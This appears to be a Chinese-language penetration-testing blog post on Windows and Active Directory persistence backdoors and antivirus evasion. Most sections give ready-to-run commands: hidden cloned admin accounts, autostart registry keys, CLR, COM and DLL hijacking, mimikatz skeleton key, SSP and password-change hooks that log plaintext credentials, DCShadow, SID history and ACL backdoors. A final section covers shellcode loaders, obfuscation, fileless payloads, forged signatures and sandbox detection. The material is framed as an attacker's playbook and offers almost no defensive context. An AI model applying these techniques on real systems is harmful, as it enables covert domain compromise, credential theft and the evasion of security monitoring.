---
layout: post
title: 持久化后门
categories: 渗透
description: 渗透测试 之 持久化
keywords: 渗透测试，持久化，后门，免杀

---

驻留、免杀

## 0x01 持久化后门

### 1.程序替换

很久很久之前的方法，像是粘滞键（5次shift）、设置中心（Windows+U键）等等，在低版本系统中可以通过替换这些程序为我们想要的比如cmd.exe，就可以做到最简单的后门。

```makefile
其中
粘滞键：C:\Windows\System32\sethc.exe
设置中心：C:\Windows\System32\utilman.exe
将cmd.exe复制到目标文件目录，改名后覆盖。

替换不常用服务的工具：msf自带exploit/windows/local/persistence_service
```

### 2.账户克隆(rid hijack)

Windows使用安全帐户管理器（SAM）来存储本地用户和内置帐户的安全描述符，每个帐户都有一个指定的RID来标识它。我们新建用户，之后导出注册表，并用administrator的f值替换新用户的f值，删掉新用户，再导入注册表，新用户可以正常使用，但net user看不到，也删不掉，只能通过注册表操作。

```csharp
net user lce$ lce.123 /add  //创建匿名用户
net localgroup administrators lce$ /add //加入管理员组
目标注册表键值位置:HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users
//PS：SAM键值默认是system权限修改，所以修改一下SAM键的权限，给予administrator完全控制和读取权限
导出lce$的值，并把administrator用户对应的项的F值复制到lce$对应项中的F值
net user lce$ /del //删掉lce$
使用导出的注册表文件，用先前导出的注册表键值对注册表进行修改，重新还原之前的匿名用户  //还原匿名用户lce$

相关工具:msf：post/windows/manage/rid_hijack，Windows-User-Clone.ps1，Create-Clone.ps1
```

### 3.自启动

**注册表自启动项**

注册表简介：类似一种树状数据库。

```undefined
HKEY_CLASSES_ROOT    用于存储一些文档类型、类、类的关联属性
HKEY_CURRENT_CONFIG    用户存储有关本地计算机系统的当前硬件配置文件信息
HKEY_CURRENT_USER    用于存储当前用户配置项
HKEY_CURRENT_USER_LOCAL_SETTINGS    用于存储当前用户对计算机的配置项
HKEY_LOCAL_MACHINE    用于存储当前用户物理状态
HKEY_USERS    用于存储新用户的默认配置项
```

注册表自启动键值位置：

```undefined
修改自动项，达到开机自启动恶意程序
用户：
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
管理员：
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
```

**开始菜单启动项**

指示启动文件夹的位置，其中User Shell Folders优先于Shell Folders。

```sql
修改注册表，可以修改开始菜单启动项
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
```

**计划任务**

通过Window系统的任务计划程序功能实现定时启动某个任务程序，Windows下计划任务的命令有：at和schtasks，其中at命令在win7等高版本windows中不能将任务放在前台执行，也就是只会打开一个后台进程，而schtasks是将定时的任务在前台执行。

```sql
图形化工具：taskschd.msc
命令行工具：schtasks.exe
SCHTASKS /parameter [arguments]
/Create         创建新计划任务
/Delete         删除计划任务
/Query          显示所有计划任务
/Run            运行计划任务
/End            中止当前正在运行的计划任务
比如:
cmd> SCHTASKS /Create /TN update /TR xxx(要执行的命令)  /DELAY ONLOGON /F /RL HIGHEST
```

### 4.clr hijack

CLR(Common Language Runtime公共语言运行库)和Java虚拟机一样是一个运行时环境，是一个可由多种编程语言使用的运行环境。CLR是 .Net Framework的主要执行引擎，无需管理员权限的后门，并能够劫持所有.Net程序，执行有些程序时会默认会调用.Net程序，从而使我们的后门自动触发。

```javascript
cmd> SET COR_ENABLE_PROFILING=1
cmd> SET COR_PROFILER={11111111-1111-1111-1111-111111111111}   //{11111111-1111-1111-1111-111111111111}表示CLSID可设置为任意数值，只要和系统常用CLSID不冲突
cmd> SET KEY=HKEY_CURRENT_USER\Software\Classes\CLSID\{11111111-1111-1111-1111-111111111111}\lceServe  //新建子项{11111111-1111-1111-1111-111111111111}\lceServe
cmd> REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F    //新建REG_SZ类型键值ThreadingModel:Apartment
cmd> REG.EXE ADD %KEY% /VE /T REG_SZ /D "%CD%\evil.dll" /F  //修改默认路径值为evil.dll"的路径
cmd> powershell //启动powershell时执行目标dll
PS：需要注册为全局变量，不然只能在这个cmd窗口劫持：
cmd> SETX COR_ENABLE_PROFILING=1 /M
cmd> SETX COR_PROFILER={11111111-1111-1111-1111-111111111111} /M

自动化工具：CLR-Injection.bat
```

### 5 .com hijack

Component Object Model（组件对象模型），是微软的一套软件组件的二进制接口标准，使得跨编程语言的进程间通信、动态对象创建成为可能。利用COM劫持技术，通过修改CLSID下的注册表键值，实现对CAccPropServicesClass和MMDeviceEnumerator劫持，而系统很多正常程序启动时需要调用这两个实例。

```javascript
首先在%APPDATA%\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}\目录下放入恶意dll文件   //若Installer文件夹不存在，则依次创建Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}
然后修改注册表，在HKCU\Software\Classes\CLSID\下创建项{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}
然后再创建一个子项lceServer，值默为dll文件路径。再创建一个键ThreadingModel，键值为：Apartment
之后可以通过打开相关程序比如iexplore.exe来调用恶意dll

相关工具：COM-Object-hijacking
```

### 6.junction folder

文件夹命名为：name.{clsid}。当浏览时，就会执行对应的clsid的dll。

### 7.msdtc

Distributed Transaction Coordinator，微软分布式传输协调程序，Windows系统默认启动该服务。计算机加入域，MSDTC服务启动时，会搜索注册表HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSDTC\MTxOCI，并加载3个DLL：oci.dll、SQLLib80.dll、xa80.dll。但是默认oci.dll是没有的，可以自己在system32下放置一个恶意oci.dll，实现劫持。

**除了上面说的一些，还有其他许多方法可以实现dll劫持，继续探索。DLL劫持识别开源工具：Rattler。**

### 8.DSRM

每一个域控都有一个本地管理员账户（并非域的管理员帐户），也就是所谓的目录服务还原模式（DSRM）账户。DSRM的密码是在DC安装时就要设置，很少会被重置。本地用户的hash存在sam文件，而域内用户hash存在ntds.dit。不使用域控的administrator进行pth，使用dsrm用户pth。但是dsrm默认不能pth，但是改了注册表就可以了。默认情况下域控的administrator密码与dsrm是不同的，我们首先同步密码，之后修改注册表。

```sql
1.同步密码：
NTDSUTIL 
SET DSRM PASSWORD 
SYNC FROM DOMAIN ACCOUNT <your user like krbtgt> 
Q 
Q
PS：Windows Server 2008 需要安装KB961320补丁才支持DSRM密码同步，而Windows Server 2003不支持DSRM密码同步
2.使用mimikatz查看密码是否同步
3.修改注册表允许DSRM账户远程访问：
HKLM\System\CurrentControlSet\Control\Lsa\DSRMAdminLogonBehavior值设置为为2（代表无论哪一种情况，你都可以使用DSRM管理员帐户登录。）   //默认不存在，手动添加
4.使用hash远程登录即可pth：
privilege::debug
sekurlsa::pth /domain:w7 /user:Administrator /ntlm:xxxxxxxx
```

### 9.SSP

Security Support Provider（安全支持提供程序），是Windows API，用于扩展Windows身份验证机制。lsass进程正在Windows启动期间加载其提供的dll，我们可以通过修改或者替换dll实现与lsass进程进行交互并记录该进程中存储的所有密码信息。

```sql
注册SSP DLL方式：
mimikatz提供mimilib.dll，并放到与lsass进程（System32）相同的位置C:\Windows\System32\
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages" /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /t REG_MULTI_SZ   //修改注册表项以包括新的安全支持提供程序mimilib
注册表已被篡改并且DLL存储在系统中，因此在重新启动后继续存在。当域用户再次通过系统进行身份验证时，将创建一个C:\Windows\System32\kiwissp.log文件，该文件将记录帐户的凭据。

内存注入方式：
（不需将mimilib.dll放入磁盘或修改注册表，重启后失效）
privilege::debug
misc::memssp
在用户再次通过系统认证时，会创建C:\Windows\System32\mimilsa.log文件，包含用户纯文本密码。

PS：除了使用mimikatz以外，也可以使用后渗透神器Empire或者powersploit来实现这两种方式。
```

### 10.sid history

每个用户帐号都有一个关联的安全标识符SID，作用是跟踪安全主体控制用户连接资源时的访问权限，也就是在域迁移过程中保持域用户的访问权限，如果迁移后用户的SID值改变，系统会将原来的SID添加到迁移后用户的SID History属性中，使迁移后的用户保持原有权限。我们的目的是使用mimikatz将SID History属性添加到任意用户的SID History属性中，以获得管理员权限。

```php
privilege::debug
sid::patch  //修复NTDS服务
sid::add /sam:hacker /new:administrator
sid::clear /sam:hacker  //清除SID History
```

### 11.skeleton key

将万能密码注入到lsass.exe中，域内所有用户的原密码和万能密码都可以登录，重启后失效。

```cpp
privilege::debug
!+                                          //绕过LSA Protection，需要导入驱动mimidrv.sys文件：https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_kernel.c
!processprotect /process:lsass.exe /remove  //绕过LSA Protection
misc::skeleton
之后可以用域内任意账号登录，万能密码默认为mimikatz

PS：mimikatz绕过cmd，regedit禁用：
privilege::debug
misc::cmd
misc::regedit
misc::taskmgr
```

### 12.hook passwordchangenotify

修改密码时，lsa会调用passwordfileter检查是否符合复杂性要求，之后调用passwordchangenotify在系统中同步密码。其中函数PasswordChangeNotify在rassfm.dll中。我们注入一个dll文件，hook掉passwordchangenotify，读取密码。

```cpp
使用HookPasswordChange.dll和HookPasswordChangeNotify.ps1（尾部添加Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll –procname lsass）
PowerShell.exe -ExecutionPolicy Bypass -File HookPasswordChangeNotify.ps1    //使用powershell运行脚本
在C:\Windows\Temp\passwords.txt中记录明文密码
```

### 13.dcshadow

防止持久化操作被SIEM等系统记录，伪造一个域控，实行完操作后，将数据同步到真实域控。

```bash
lsadump::dcshadow /object:CN=dc,CN=Users,DC=lce,DC=com /attribute:primarygroupid/value:512     //使用system权限添加域管 
lsadump::dcshadow /push     //使用域管权限进行域复制，后同
lsadump::dcshadow /object:CN=dc,CN=Users,DC=lce,DC=com /attribute:sidhistory /value:S-1-5-21-771480511-316148334-622873008-500   //sid history后门
```

### 14.acl

方法1：基于注册表ACL后门，在域控制器上将hklm的特定键值分配everyone读取权限，使用DAMP这个工具设置即可。之后在。普通用户机器上读ntlm hash。

```java
首先在域控上修改：
import-module Add-RemoteRegBackdoor.ps1 //导入
Add-RemoteRegBackdoor -ComputerName client.external.local -Trustee 'S-1-1-0' -Verbose 
然后普通用户机器上读ntlm hash：
import-module RemoteHashRetrieval.ps1   //导入
Get-RemoteLocalAccountHash -ComputerName ad1 -Verbose   //域内普通用户读取域管ntlm hash
之后可以pth等等
```

方法2：基于域策略文件权限后门，域里机器每过一段时间会访问域控制器的C:\Windows\SYSVOL\sysvol\domain. com\Policies 以更新它们的策略。我们可以配置Policies的文件夹权限为everyone完全控制。

```cpp
cacls C:\Windows\SYSVOL\sysvol\lce.com\Policies /e /t /c /g "EveryOne":f  //配置policies文件夹权限为everyone完全控制
import-module powerview.ps1 //导入powerview脚本
Get-NETGPO -ComputerName w7 |fl gpcfilesyspath  //查询某台机器对应的策略文件
找到目标文件夹下MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf文件，在文件末尾添加：//修改策略
[Registry Values] MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskhost.exe\Debugger=1,c:\windows\system32\calc.exe [Version] signature="$CHICAGO$" Revision=1
gpupdate /force //手动刷新策略触发策略启动计算器
```

方法3：dcsync后门，在高级功能的安全中把everyone用户设置成完全控制，任意用户可以导出域hash，并pth。

### 15.其他方式

**office系列**

基本思路是将恶意dll文件保存到office打开时会调用dll的位置，如%APPDATA%\Microsoft\Word\Startup、%appdata%\Microsoft\AddIns等，然后修改注册表，实现打开office软件加载恶意dll的目的。

**windows库**

创建clsid；在Windows的xml库文件中插入simplelocation元素。

**应用插件和扩展**

比如chrome的恶意插件，vs，notepad++等。

> 其他后门方式也还有很多，多多探索，不局限于这些入门级的后门!

 

## 0x02 免杀浅析

### 1.分离免杀

**shellcode loader**

通过使用加载器将shellcode与加载程序分开，以此达到分离免杀效果。可以自己造个轮子用，配合编码，免杀效果还可以。在最后我给出我学习写的一个例子仅供参考。
现成的工具有shellcode_launcher-master等。

**白加黑**

基于Windows的白名单，执行目标代码。比如用msbuild编译执行c#代码，用rundll32执行动态链接库dll文件等等。

### 2.混淆免杀

**编码混淆**

使用异或编码、base64、十六进制等等，也可以在生成shellcode时选择加密方式，如msfvenom。有能力的话也可以使用一些偏僻语言编写，能够绕过没有涉及这种语言的杀软。
开源工具：shellcode_encoder。（也可以自己写来用，用python写比较方便）

**注入混淆**

将shellcode注入到应用进程如putty.exe中。
一些工具：bdf、shellter、Avet、veil。

### 3.其他

**无文件落地**

所谓的无文件落地，恶意程序不是以普通文件的方式存在，而是以脚本的形式存在计算机中的注册表中，以此来躲避杀软的检测，并且在Windows启动时都会调用注册表中的命令。因此无文件落地攻击包括两个流程：写入注册表+下载并加载远程代码。这种方式需要编写客户端和服务端，造完轮子后用处很大。

**伪造证书签名**

一些杀软通过检测证书来判断是否为恶意程序。两种方法伪造证书：添加在文件末尾(Authenticode)和CAT文件(catalog)。
证书伪造工具：SigThief-master

**内核数量检测**

沙盒检测时为了减少主机资源的占用，分配较少的内核，根据检测内核的数量判断是否存在于被检测环境中。

**Tick Count值检测**

杀软为了满足用户的需求，一般扫描速度都比较快，以前进行免杀时都是用sleep函数，等到杀软运行完了再执行shellcode。目前基本都会跳过sleep函数，我们可以使用两个GetTickCout()的值来判断是否跳过了sleep函数，以达到检测是否在被检测的环境下。
